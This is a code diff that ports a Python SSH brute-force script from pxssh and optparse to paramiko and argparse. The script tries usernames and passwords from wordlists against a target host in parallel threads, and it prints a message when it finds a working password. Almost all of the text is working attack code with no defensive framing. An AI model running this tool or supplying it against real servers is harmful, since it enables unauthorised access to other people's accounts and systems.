@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*-
 # @Autor: Diego Rodrigues Pereira
 # Comando: python ssh_bruteforce.py -H 192.168.1.1 -U users.txt -W wordlist.txt 
-import optparse
-from pexpect import pxssh
+import argparse
+import paramiko
 import time
 import threading
 import os
@@ -14,42 +14,42 @@ Fails = 0
 
 def connect(host, user, password, release):
     global Found, Fails
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        s = pxssh.pxssh()
-        s.login(host, user, password)
+        ssh.connect(host, username=user, password=password, timeout=5)
         print('[+] Good , Key Found: ' + password)
         Found = True
     except Exception as e:
-        if 'read_nonblocking' in str(e):
+        if 'Authentication failed' in str(e):
             Fails += 1
-            time.sleep(5)
-            connect(host, user, password, False)
-        elif 'synchronize with original prompt' in str(e):
-            time.sleep(1)
-            connect(host, user, password, False)
+        elif 'timed out' in str(e):
+            Fails += 1
+        else:
+            print(str(e))
     finally:
+        ssh.close()
         if release:
             connection_lock.release()
 
-
 def run():
-    parser = optparse.OptionParser('usage: '+'-H <target host> -U <userlist> -P <passlist>')
-    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
-    parser.add_option('-U', dest='userList', type='string', help='specify user list file')
-    parser.add_option('-P', dest='passList', type='string', help='specify password list file')
-    parser.add_option('-W', dest='wordlist', type='string', help='specify wordlist file')
-    parser.add_option('-c', dest='count', type='int', help='specify the max ssh connect count, default 5', default=5)
-    (options, args) = parser.parse_args()
+    parser = argparse.ArgumentParser('usage: '+'-H <target host> -U <userlist> -P <passlist>')
+    parser.add_argument('-H', dest='tgtHost', type=str, help='specify target host')
+    parser.add_argument('-U', dest='userList', type=str, help='specify user list file')
+    parser.add_argument('-P', dest='passList', type=str, help='specify password list file')
+    parser.add_argument('-W', dest='wordlist', type=str, help='specify wordlist file')
+    parser.add_argument('-c', dest='count', type=int, help='specify the max ssh connect count, default 5', default=5)
+    args = parser.parse_args()
 
     global connection_lock
-    connection_lock = threading.BoundedSemaphore(options.count)
+    connection_lock = threading.BoundedSemaphore(args.count)
 
-    host = options.tgtHost
-    userListFile = options.userList
-    passListFile = options.passList
-    wordlistFile = options.wordlist
+    host = args.tgtHost
+    userListFile = args.userList
+    passListFile = args.passList
+    wordlistFile = args.wordlist
 
-    if host == None or userListFile == None or passListFile == None:
+    if host is None or userListFile is None or passListFile is None:
         print(parser.usage)
         exit(0)
 
